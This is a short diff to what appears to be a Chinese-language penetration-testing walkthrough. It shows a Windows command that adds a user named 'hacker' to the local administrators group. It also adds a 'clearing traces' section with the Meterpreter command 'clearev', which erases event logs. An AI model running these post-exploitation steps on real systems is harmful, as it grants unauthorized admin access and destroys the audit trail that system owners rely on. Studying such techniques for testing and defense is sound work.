@@ -315,3 +315,8 @@ C:\Windows\system32>net localgroup administrators hacker /add
 net localgroup administrators hacker /add
 ▒▒▒▒ɹ▒▒▒ɡ▒
 ```
+
+### 0x06 清理痕迹
+```
+meterpreter > clearev
+```
